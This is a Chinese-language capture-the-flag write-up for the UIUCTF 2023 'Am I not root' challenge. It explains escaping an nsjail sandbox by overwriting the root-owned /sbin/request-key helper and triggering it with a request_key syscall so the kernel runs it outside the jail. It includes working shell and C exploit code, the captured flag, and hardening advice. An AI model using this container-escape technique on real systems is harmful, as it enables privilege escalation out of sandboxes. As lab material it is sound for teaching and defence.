# UIUCTF 2023 Am I not root Writeup

## 题目简述

题目在 QEMU 虚拟机中启动 nsjail。进入 jail 后看似是 root，但该进程位于新的 user、PID 和 mount namespace 中，并且在父 user namespace 中没有能力位。常见的 `modprobe_path`、`core_pattern`、加载模块、`ptrace` 外部进程等逃逸路线都被题目配置阻断。

特殊之处在于 nsjail 由全局 UID 0 启动，jail 内 UID 1000 映射到外部 KUID 0。进程虽然缺少父 namespace 的 capabilities，却仍以全局 root 身份参与普通文件 DAC 权限检查，因此可以覆盖 root 拥有的 `/sbin/request-key`。

## 解题过程

Linux 的 `request_key` 系统调用在找不到指定 key 且提供了 `callout_info` 时，会通过内核 user-mode helper 启动固定路径 `/sbin/request-key`。这个 helper 由内核在初始 namespace 中创建，正好能越过 jail 的 PID 和 mount namespace 边界。

首先把 `/sbin/request-key` 替换为脚本。helper 能在外层看到以 9p 挂载的 `/mnt/flag`，将其写到虚拟机串口即可把内容送回当前连接：

```bash
cat > /sbin/request-key <<'EOF'
#!/bin/bash
cat /mnt/flag > /dev/ttyS0
EOF
chmod a+x /sbin/request-key
```

然后编写一个最小程序触发 `request_key`：

```c
#include <linux/keyctl.h>
#include <sys/syscall.h>
#include <unistd.h>

int main(void)
{
    return syscall(
        SYS_request_key,
        "user",                    /* 内核已注册的 key 类型 */
        "UIUCTF",                  /* 不存在的 key 描述 */
        "2023",                    /* 非空 callout_info，触发 helper */
        KEY_SPEC_THREAD_KEYRING     /* 可用的目标 keyring */
    ) < 0;
}
```

编译并执行：

```bash
gcc -O2 -o exploit exploit.c
./exploit
```

内核在初始 namespace 中执行刚写入的 `/sbin/request-key`，脚本读取外层挂载的 flag 并输出到串口：

```text
uiuctf{need_more_isolations_for_root_5a4bb464}
```

## 方法总结

“没有 capabilities”不等于“完全不是全局 root”。user namespace 会隔离能力集合，但 KUID 0 仍可能通过普通文件权限获得危险写权限。本题利用这点替换 user-mode helper，再借 `request_key` 让内核在初始 namespace 中执行它。容器或 jail 启动器不应让不可信进程映射到宿主 KUID 0；同时应使用只读根文件系统、隐藏或只读挂载敏感内核接口，并阻断不必要的 user-mode helper 路径。
